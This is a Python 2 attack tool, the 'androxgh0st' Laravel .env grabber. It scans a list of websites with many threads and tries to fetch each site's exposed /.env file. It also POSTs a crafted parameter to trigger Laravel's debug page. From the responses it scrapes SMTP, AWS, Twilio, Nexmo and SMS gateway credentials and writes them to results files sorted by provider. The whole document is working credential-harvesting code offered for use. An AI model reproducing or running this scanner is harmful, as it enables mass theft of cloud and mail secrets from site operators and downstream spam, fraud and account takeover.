# -*- coding: utf-8 -*-
import requests, os, sys
from re import findall as reg

requests.packages.urllib3.disable_warnings()
from threading import *
from threading import Thread
from ConfigParser import ConfigParser
from Queue import Queue

try:
    os.mkdir('Results')
except:
    pass


class Worker(Thread):
    def __init__(self, tasks):
        Thread.__init__(self)
        self.tasks = tasks
        self.daemon = True
        self.start()

    def run(self):
        while True:
            func, args, kargs = self.tasks.get()
            try:
                func(*args, **kargs)
            except Exception, e:
                print e
            self.tasks.task_done()


class ThreadPool:
    def __init__(self, num_threads):
        self.tasks = Queue(num_threads)
        for _ in range(num_threads): Worker(self.tasks)

    def add_task(self, func, *args, **kargs):
        self.tasks.put((func, args, kargs))

    def wait_completion(self):
        self.tasks.join()


class androxgh0st:
    def get_twillio(self, text, url):
        try:
            if "TWILIO" in text:
                if "TWILIO_SID=" in text:
                    method = '/.env'
                    acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
                    acc_key = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
                    fromphone = reg('\nTWILIO_FROM=(.*?)\n', text)[0]
                elif '<td>TWILIO_SID</td>' in text:
                    method = 'debug'
                    acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    acc_key = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    fromphone = reg('<td>TWILIO_FROM<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nTWILIO_SID: ' + str(
                    acc_sid) + '\nTWILIO_TOKEN: ' + str(acc_key) + '\nTWILIO_FROM: ' + str(
                    fromphone)
                remover = str(build).replace('\r', '')
                save = open('Results/TWILLIO.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_twillio1(self, text, url):
        try:
            if "TWILIO" in text:
                if "TWILIO_SID=" in text:
                    method = '/.env'
                    acc_sid = reg('\nTWILIO_SID=(.*?)\n', text)[0]
                    acc_key = reg('\nTWILIO_TOKEN=(.*?)\n', text)[0]
                    phone = reg('\nTWILIO_PHONE=(.*?)\n', text)[0]
                elif '<td>TWILIO_SID</td>' in text:
                    method = 'debug'
                    acc_sid = reg('<td>TWILIO_SID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    acc_key = reg('<td>TWILIO_TOKEN<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    phone = reg('<td>TWILIO_PHONE<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nTWILIO_SID: ' + str(
                    acc_sid) + '\nTWILIO_TOKEN: ' + str(acc_key) + '\nTWILIO_PHONE: ' + str(
                    phone)
                remover = str(build).replace('\r', '')
                save = open('Results/TWILLIO-1.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_awskey(self, text, url):
        try:
            if "AWS_ACCESS" in text:
                if "AWS_ACCESS_KEY_ID=" in text:
                    method = '/.env'
                    aws_id = reg('\nAWS_ACCESS_KEY_ID=(.*?)\n', text)[0]
                    aws_key = reg('\nAWS_SECRET_ACCESS_KEY=(.*?)\n', text)[0]
                    region = reg('\nAWS_DEFAULT_REGION=(.*?)\n', text)[0]
                    bucket = reg('\nAWS_BUCKET=(.*?)\n', text)[0]
                elif '<td>AWS_ACCESS_KEY_ID</td>' in text:
                    method = 'debug'
                    aws_id = reg('<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    aws_key = reg('<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    region = reg('<td>AWS_DEFAULT_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    bucket = reg('<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nAWS_ACCESS_KEY_ID: ' + str(
                    aws_id) + '\nAWS_SECRET_ACCESS_KEY: ' + str(aws_key) + '\nAWS_DEFAULT_REGION: ' + str(
                    region) + '\nAWS_BUCKET: ' + str(bucket)
                remover = str(build).replace('\r', '')
                save = open('Results/AWS-KEY.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_awskey1(self, text, url):
        try:
            if "AWS_KEY" in text:
                if "AWS_KEY=" in text:
                    method = '/.env'
                    aws_id = reg('\nAWS_KEY=(.*?)\n', text)[0]
                    aws_key = reg('\nAWS_SECRET=(.*?)\n', text)[0]
                    region = reg('\nAWS_REGION=(.*?)\n', text)[0]
                    bucket = reg('\nAWS_BUCKET=(.*?)\n', text)[0]
                elif '<td>AWS_KEY</td>' in text:
                    method = 'debug'
                    aws_id = reg('<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    aws_key = reg('<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    region = reg('<td>AWS_REGION<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    bucket = reg('<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nAWS_KEY: ' + str(
                    aws_id) + '\nAWS_SECRET: ' + str(aws_key) + '\nAWS_REGION: ' + str(
                    region) + '\nAWS_BUCKET: ' + str(bucket)
                remover = str(build).replace('\r', '')
                save = open('Results/AWS-KEY-1.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_sms(self, text, url):
        try:
            if "SMS" in text:
                if "SMS_USERNAME=" in text:
                    method = '/.env'
                    sms_user = reg('\nSMS_USERNAME=(.*?)\n', text)[0]
                    sms_pass = reg('\nSMS_PASSWORD=(.*?)\n', text)[0]
                    sms_name = reg('\nSMS_SENDER_NAME=(.*?)\n', text)[0]
                    sms_url = reg('\nSMS_BASE_URL=(.*?)\n', text)[0]
                    sms_phone = reg('\nSMS_SEND_NUMBER=(.*?)\n', text)[0]
                elif '<td>SMS_USERNAME</td>' in text:
                    method = 'debug'
                    sms_user = reg('<td>SMS_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    sms_pass = reg('<td>SMS_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    sms_name = reg('<td>SMS_SENDER_NAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    sms_url = reg('<td>SMS_BASE_URL<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    sms_phone = reg('<td>SMS_SEND_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nSMS_USERNAME: ' + str(
                    sms_user) + '\nSMS_PASSWORD: ' + str(sms_pass) + '\nSMS_SENDER_NAME: ' + str(
                    sms_name) + '\nSMS_BASE_URL: ' + str(sms_url) + '\nSMS_SEND_NUMBER: ' + str(sms_phone)
                remover = str(build).replace('\r', '')
                save = open('Results/SMS.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_nexmo(self, text, url):
        try:
            if "NEXMO" in text:
                if "NEXMO_KEY=" in text:
                    method = '/.env'
                    idn1 = reg('\nNEXMO_KEY=(.*?)\n', text)[0]
                    idn2 = reg('\nNEXMO_SECRET=(.*?)\n', text)[0]
                    idn3 = reg('\nNEXMO_NUMBER=(.*?)\n', text)[0]
                elif '<td>NEXMO_KEY</td>' in text:
                    method = 'debug'
                    idn1 = reg('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    idn2 = reg('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    idn3 = reg('<td>NEXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nNEXMO_KEY: ' + str(

                    idn1) + '\nNEXMO_SECRET: ' + str(idn2) + '\nNEXMO_NUMBER: ' + str(
                    idn3)
                remover = str(build).replace('\r', '')
                save = open('Results/NEXMO.txt', 'a')
                save.write(remover + '\n\n')
                save.close()
                return True
            else:
                return False
        except:
            return False

    def get_smtp(self, text, url):
        try:
            if "MAIL_HOST" in text:
                if "MAIL_HOST=" in text:
                    method = '/.env'
                    mailhost = reg("\nMAIL_HOST=(.*?)\n", text)[0]
                    mailport = reg("\nMAIL_PORT=(.*?)\n", text)[0]
                    mailuser = reg("\nMAIL_USERNAME=(.*?)\n", text)[0]
                    mailpass = reg("\nMAIL_PASSWORD=(.*?)\n", text)[0]
                    mailfrom = reg("\nMAIL_FROM_ADDRESS=(.*?)\n", text)[0]
                elif "<td>MAIL_HOST</td>" in text:
                    method = 'debug'
                    mailhost = reg('<td>MAIL_HOST<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailport = reg('<td>MAIL_PORT<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailuser = reg('<td>MAIL_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailpass = reg('<td>MAIL_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    mailfrom = reg('<td>MAIL_FROM_ADDRESS<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                if mailuser == "null" or mailpass == "null" or mailfrom == "null" or mailuser == "" or mailpass == "" or mailfrom == "":
                    return False
                else:
                    # mod aws
                    if '.amazonaws.com' in mailhost:
                        getcountry = reg('email-smtp.(.*?).amazonaws.com', mailhost)[0]
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass) + '\nMAILFROM: ' + str(mailfrom)
                        remover = str(build).replace('\r', '')
                        save = open('Results/' + getcountry[:-2] + '.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    elif 'smtp.sendgrid.net' in mailhost:
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass)
                        remover = str(build).replace('\r', '')
                        save = open('Results/Sendgrid.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    elif 'smtp.zoho.com' in mailhost:
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass)
                        remover = str(build).replace('\r', '')
                        save = open('Results/Zoho.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    elif 'smtp.mandrillapp.com' in mailhost:
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass)
                        remover = str(build).replace('\r', '')
                        save = open('Results/MandrillApp.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    elif 'smtp.office365.com' in mailhost:
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass)
                        remover = str(build).replace('\r', '')
                        save = open('Results/Office365.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    elif 'smtp.gmail.com' in mailhost:
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass)
                        remover = str(build).replace('\r', '')
                        save = open('Results/GMail.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    elif '.mailgun.org' in mailhost:
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass)
                        remover = str(build).replace('\r', '')
                        save = open('Results/Mailgun.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    elif '.mailjet.com' in mailhost:
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass)
                        remover = str(build).replace('\r', '')
                        save = open('Results/Mailjet.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    else:
                        build = 'URL: ' + str(url) + '\nMETHOD: ' + str(method) + '\nMAILHOST: ' + str(
                            mailhost) + '\nMAILPORT: ' + str(mailport) + '\nMAILUSER: ' + str(
                            mailuser) + '\nMAILPASS: ' + str(mailpass)
                        remover = str(build).replace('\r', '')
                        save = open('Results/SMTP_RANDOM.txt', 'a')
                        save.write(remover + '\n\n')
                        save.close()
                    return True
            else:
                return False
        except Exception as err:
            print(str(err))
            return False


def printf(text):
    ''.join([str(item) for item in text])
    print(text + '\n'),


def main(url):
    resp = False
    try:
        text = '\033[32;1m[LARAVEL .ENV BY AZHAR]\033[0m ' + url
        headers = {
            'User-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36'}
        get_source = requests.get(url + "/.env", headers=headers, timeout=8, verify=False, allow_redirects=False).text
        if "APP_KEY=" in get_source:
            resp = get_source
        else:
            get_source = requests.post(url, data={"0x[]": "androxgh0st"}, headers=headers, timeout=8, verify=False,
                                       allow_redirects=False).text
            if "<td>APP_KEY</td>" in get_source:
                resp = get_source
        if resp:
            getsmtp = androxgh0st().get_smtp(resp, url)
            getwtilio = androxgh0st().get_twillio(resp, url)
            getwtilio1 = androxgh0st().get_twillio1(resp, url)
            getawskey = androxgh0st().get_awskey(resp, url)
            getawskey1 = androxgh0st().get_awskey1(resp, url)
            getnexmo = androxgh0st().get_nexmo(resp, url)
            getsms = androxgh0st().get_sms(resp, url)
            if getsmtp:
                text += ' | \033[32;1mSMTP\033[0m'
            else:
                text += ' | \033[31;1mSMTP\033[0m'
            if getwtilio:
                text += ' | \033[32;1mTWILIO\033[0m'
            else:
                text += ' | \033[31;1mTWILIO\033[0m'
            if getwtilio1:
                text += ' | \033[32;1mTWILIO-1\033[0m'
            else:
                text += ' | \033[31;1mTWILIO-1\033[0m'
            if getawskey:
                text += ' | \033[32;1mAWS_KEY\033[0m'
            else:
                text += ' | \033[31;1mAWS_KEY\033[0m'
            if getawskey1:
                text += ' | \033[32;1mAWS_KEY-1\033[0m'
            else:
                text += ' | \033[31;1mAWS_KEY-1\033[0m'
            if getsms:
                text += ' | \033[32;1mSMS\033[0m'
            else:
                text += ' | \033[31;1mSMS\033[0m'
            if getnexmo:
                text += ' | \033[32;1mNEXMO\033[0m'
            else:
                text += ' | \033[31;1mNEXMO\033[0m'
    except:
        text = '\033[31;1m[LARAVEL .ENV BY AZHAR]\033[0m ' + url +'\033[31;1m => Cant get access!\033[0m '
    printf(text)


if __name__ == '__main__':
    print('''
___________________________________________________________________________________________
===========================================================================================
                        ____          _ _                       
                       / __ )____ _  (_|_)___  ____ _____ _______
                      / __  / __ `/ / / / __ \/ __ `/ __ `/ __  /
                     / /_/ / /_/ / / / / / / / /_/ / /_/ / / / /
                    /_____/\__,_/_/ /_/_/ /_/\__, /\__,_/_/ /_/ 
                               /___/        /____/      GRABBER           
===========================================================================================
        _____________ SIMPLE LARAVEL .ENV GRABBER \033[32;1m\033[0m V1 ==> ZIQKUL AZHAR ____________       \n''')
    try:
        readcfg = ConfigParser()
        readcfg.read(pid_restore)
        lists = readcfg.get('DB', 'FILES')
        numthread = readcfg.get('DB', 'THREAD')
        sessi = readcfg.get('DB', 'SESSION')
        print("log session bot found! restore session")
        print(
                    '''Using Configuration :\n\tFILES=''' + lists + '''\n\tTHREAD=''' + numthread + '''\n\tSESSION=''' + sessi)
        tanya = raw_input("Want to contineu session ? [Y/n] ")
        if "Y" in tanya or "y" in tanya:
            lerr = open(lists).read().split("\n" + sessi)[1]
            readsplit = lerr.splitlines()
        else:
            kntl  # Send Error Biar Lanjut Ke Wxception :v
    except:
        try:
            lists = sys.argv[1]
            numthread = sys.argv[2]
            readsplit = open(lists).read().splitlines()
        except:
            try:
                lists = raw_input("List Target ? ")
                readsplit = open(lists).read().splitlines()
            except:
                print("Wrong input or list not found!")
                exit()
            try:
                numthread = raw_input("Threads ? ")
            except:
                print("Wrong thread number!")
                exit()
    pool = ThreadPool(int(numthread))
    for url in readsplit:
        if "://" in url:
            url = url
        else:
            url = "http://" + url
        if url.endswith('/'):
            url = url[:-1]
        jagases = url
        try:
            pool.add_task(main, url)
        except KeyboardInterrupt:
            session = open(pid_restore, 'w')
            cfgsession = "[DB]\nFILES=" + lists + "\nTHREAD=" + str(numthread) + "\nSESSION=" + jagases + "\n"
            session.write(cfgsession)
            session.close()
            print("CTRL+C Detect, Session saved")
            exit()
    pool.wait_completion()
    try:
        os.remove(pid_restore)
    except:
        pass